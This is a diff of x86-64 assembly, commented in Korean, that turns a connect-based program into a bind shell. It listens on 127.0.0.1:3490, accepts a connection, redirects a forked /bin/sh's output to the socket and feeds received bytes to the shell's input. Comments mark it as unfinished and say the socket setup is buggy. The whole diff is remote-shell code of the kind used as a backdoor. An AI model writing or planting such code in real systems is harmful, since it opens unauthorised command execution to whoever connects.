@@ -8,35 +8,51 @@ MAXDATASIZE equ 1024
 SOCK_STREAM equ 1
 AF_INET equ 2
 
-
+; 현재 문제점 구조체 값 자체가 이상해 소켓 연결이 안됨
+; 파이프는 정상
+; 전체 구조체를 다시 수정하거나 원리를 깨달아야함
 ; Data Structure
-struc sockaddr_in ; 시작 offset 0
+struc my_addr, -16 ; rbp - 16부터 첫번째 구조체 시작
     .sin_family:    resb 2;2bytes
     .sin_port:      resb 2;2bytes
     .sin_addr:      resb 4;4bytes
     .sin_zero:      resb 8;8bytes
 endstruc
 
-struc socket, 16; 시작 offset
+struc their_addr, -32 ; rbp - 32부터 첫번째 구조체 시작
+    .sin_family:    resb 2;2bytes
+    .sin_port:      resb 2;2bytes
+    .sin_addr:      resb 4;4bytes
+    .sin_zero:      resb 8;8bytes
+endstruc
+
+struc socket, -1072; rbp - 1052 부터 첫번째 구조체 시작 
     .sockfd: resb 4; 4bytes
+    .newfd: resb 4; 4bytes
+    .sin_size: resb 4; 4bytes
     .numbytes: resb 4; 4bytes
     .buf: resb MAXDATASIZE ; 1024bytes
 endstruc
 
-struc pipefd, 1048; 시작 offset
-    resb 8
+struc pipefd, -1080 ; rbp - 1056 부터 첫번째 구조체 시작
+    .read: resb 4; 4bytes
+    .write: resb 4; 4bytes
 endstruc
 
 
 ; error message
 forkErrorMessage: db "fork",10,0
 socketErrorMessage: db "socket",10,0
-connectErrorMessage: db "connect",10,0
+bindErrorMessage: db "bind",10,0
 pipeErrorMessage: db "pipe",10,0
 closeErrorMessage: db "close",10,0
 dup2ErrorMessage: db "dup2",10,0
 recvfromErrorMessage: db "recvfrom",10,0
+setsockoptErrorMessage: db "setsockopt",10,0
+listenErrorMessage: db "listen",10,0
+acceptErrorMessage: db "accept",10,0
 command: db "/bin/sh",0
+reuseAddress: dd 1
 argv: db command, 0
 envp: db 0 
 test_command: db "whoami",10,0
@@ -62,10 +78,25 @@ _child:
 
 
     call _socket
-
-    mov dword [rbp - socket.sockfd], eax ; save to socket fd
     
-    call _connect
+    mov dword [rbp + socket.sockfd], eax ; save to socket fd
+
+    call _setsockopt
+
+
+    mov word [rbp + my_addr.sin_family], AF_INET ; host byte order
+    mov word [rbp + my_addr.sin_port], 0xa20d ; port 3490
+    mov dword [rbp + my_addr.sin_addr], 0x100007f; 127.0.0.1
+    mov qword [rbp + my_addr.sin_zero], 0
+    
+    
+    call _bind
+
+    call _listen
+
+    call _accept
+
+    mov dword [rbp + socket.newfd], eax; save to newsock fd
 
     call _pipe
 
@@ -73,8 +104,9 @@ _child:
 
 _child_execve:
     ;call _pipe
+    ; 파이프의 쓰기 단을 닫음
     ; close($rdi) 성공하면 0
-    mov edi, dword[rbp - pipefd + 4] ; write
+    mov edi, dword[rbp + pipefd.write] ; write
     mov rax, SYS_CLOSE
     syscall
     cmp rax, 0
@@ -82,8 +114,9 @@ _child_execve:
 
     ;               $rdi      $rsi
     ; int dup2(int oldfd, int newfd);
+    ; 표준 출력을 소켓으로 리디렉션
     ; 실패하면 -1
-    mov edi, dword[rbp - socket.sockfd]
+    mov edi, dword[rbp + socket.newfd]
     mov rsi, STDOUT_FILENO
     mov rax, SYS_DUP2
     syscall
@@ -92,8 +125,9 @@ _child_execve:
 
     ;               $rdi      $rsi
     ; int dup2(int oldfd, int newfd);
+    ; 표준 에러를 소켓으로 리디렉션
     ; 실패하면 -1
-    mov edi, dword[rbp - socket.sockfd]
+    mov edi, dword[rbp + socket.newfd]
     mov rsi, STDERR_FILENO
     mov rax, SYS_DUP2
     syscall
@@ -102,8 +136,9 @@ _child_execve:
 
     ;               $rdi      $rsi
     ; int dup2(int oldfd, int newfd);
+    ; 표준 입력을 파이프로 리디렉션
     ; 실패하면 -1
-    mov edi, dword[rbp - pipefd] ;read
+    mov edi, dword[rbp + pipefd.read] ;read
     mov rsi, STDIN_FILENO
     mov rax, SYS_DUP2
     syscall
@@ -112,8 +147,10 @@ _child_execve:
 
     ; $rdi, $rsi, $rdx
     lea rdi, [rel $+command-$]
-    lea rsi, [rel $+argv-$]
-    lea rdx, [rel $+envp-$]
+    xor rsi, rsi
+    xor rdx, rdx
+    ;lea rsi, [rel $+argv-$]
+    ;lea rdx, [rel $+envp-$]
     mov rax, SYS_EXECVE
     syscall
 
@@ -121,20 +158,29 @@ _child_execve:
     jmp _end
 
 
-_parent_socket:
+_parent_socket: ; TODO : recvfrom하고, 수신한 명령어를 child process에 쓰고 accept 반복!
     ;call _pipe
+    ; 파이프의 읽기 단을 닫음
     ; close($rdi) 성공하면 0
-    mov edi, dword[rbp - pipefd] ; pipefd.read
+    mov edi, dword[rbp + pipefd.read] ; pipefd.read
     mov rax, SYS_CLOSE
     syscall
     cmp rax, 0
     jne _closeFailed
 
+    call _recvfrom
+
+    mov dword[rbp + socket.numbytes], eax
+
+    ;mov byte [rbp + socket.buf + rax], 0
+
+
 _loop:
 
-    mov edi, dword[rbp - pipefd + 4] ;write
-    lea rsi, [rel $+test_command-$]
-    mov edx, 8
+    mov edi, dword[rbp + pipefd.write] ;write
+    lea rsi, [rbp + socket.buf]
+    mov edx, [rbp + socket.numbytes]
+    add edx, 1
     mov rax, SYS_WRITE
     syscall
 
@@ -181,22 +227,84 @@ _socket:
     je _sockFailed
     ret
 
-_connect:
-    ; int connect(int sockfd, const struct sockaddr *addr,
-    ;             socklen_t addrlen);
-    mov edi, dword [rbp - socket.sockfd]
-    lea rsi, [rbp - sockaddr_in]
-    mov rdx, 0x10
-    mov rax, SYS_CONNECT
+_setsockopt:
+    ;                   $rdi       $rsi         $rdx
+    ;int setsockopt(int sockfd, int level, int optname,
+    ;                               $rcx            $r8
+    ;                  const void *optval, socklen_t optlen);
+    mov edi, [rbp + socket.sockfd]
+    mov rsi, 1; SOL_SOCKET
+    mov rdx, 2 ;SO_REUSEADDR
+    lea rcx, [rel $+reuseAddress-$]
+    mov r8, 4 ;size of dword
+    mov rax, SYS_SETSOCKOPT
     syscall
     cmp rax, 0
-    jne _connectFailed
+    jne _setsockoptFailed
     ret
+
+
+_bind:
+    ;               $rdi                        $rsi
+    ; int bind(int sockfd, const struct sockaddr *addr,
+    ;                       $rdx
+    ;            socklen_t addrlen);
+    mov edi, dword [rbp + socket.sockfd]
+    lea rsi, [rbp + my_addr]
+    mov rdx, 0x10
+    mov rax, SYS_BIND
+    syscall
+    cmp rax, 0
+    jne _bindFailed
+    ret
+
+_listen:
+    ;               $rdi           $rsi
+    ;int listen(int sockfd, int backlog);    
+    mov edi, dword[rbp + socket.sockfd]
+    mov rsi, 10; max connection is 10
+    mov rax, SYS_LISTEN
+    syscall
+    cmp rax, 0
+    jne _listenFailed
+    ret
+
+_accept:
+    ;               $rdi                $rsi                $rdx
+    ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
+    mov edi, dword[rbp + socket.sockfd]
+    lea rsi, [rbp + their_addr]
+    mov dword [rbp + socket.sin_size], 0x10; fill size
+    lea rdx, [rbp + socket.sin_size]
+    mov rax, SYS_ACCEPT
+    syscall
+    cmp rax, -1
+    jle _acceptFailed
+    ret
+
+_recvfrom:
+    ;                       $rdi       $rsi        $rdx     $rcx
+    ; ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags,
+    ;                                       $r8                $r9
+    ;                    struct sockaddr *src_addr, socklen_t *addrlen)
+    mov edi, dword[rbp + socket.newfd]
+    lea rsi, dword[rbp + socket.buf]
+    mov rdx, MAXDATASIZE
+    mov rcx, 0
+    mov r8, 0
+    mov r9, 0
+    mov rax, SYS_RECVFROM
+    syscall
+    cmp rax, -1
+    jle _recvfromFailed
+    ret
+
+
 
 _pipe:
     ;               $rdi
     ; int pipe(int pipefd[2]);
-    lea rdi, qword [rbp - pipefd]
+    lea rdi, qword [rbp + pipefd]
     mov rax, SYS_PIPE
     syscall
     cmp rax, 0
@@ -245,11 +353,21 @@ _sockFailed:
     pop rbp
     exit
 
-_connectFailed:
+_bindFailed:
     mov rax, 1 ; write
     mov rdi, 1 ; stdout
-    lea rsi, [rel $+connectErrorMessage-$]
-    mov rdx, 8 ; len
+    lea rsi, [rel $+bindErrorMessage-$]
+    mov rdx, 5 ; len
+    syscall
+    mov rsp, rbp
+    pop rbp
+    exit
+
+_listenFailed:
+    mov rax, 1 ; write
+    mov rdi, 1 ; stdout
+    lea rsi, [rel $+listenErrorMessage-$]
+    mov rdx, 7 ; len
     syscall
     mov rsp, rbp
     pop rbp
@@ -285,11 +403,31 @@ _dup2Failed:
     pop rbp
     exit
 
+_acceptFailed:
+    mov rax, 1 ; write
+    mov rdi, 1 ; stdout
+    lea rsi, [rel $+acceptErrorMessage-$]
+    mov rdx, 7 ; len
+    syscall
+    mov rsp, rbp
+    pop rbp
+    exit
+
 _recvfromFailed:
     mov rax, 1 ; write
     mov rdi, 1 ; stdout
     lea rsi, [rel $+recvfromErrorMessage-$]
     mov rdx, 9 ; len
+    syscall
+    mov rsp, rbp
+    pop rbp
+    exit
+
+_setsockoptFailed:
+        mov rax, 1 ; write
+    mov rdi, 1 ; stdout
+    lea rsi, [rel $+setsockoptErrorMessage-$]
+    mov rdx, 11 ; len
     syscall
     mov rsp, rbp
     pop rbp
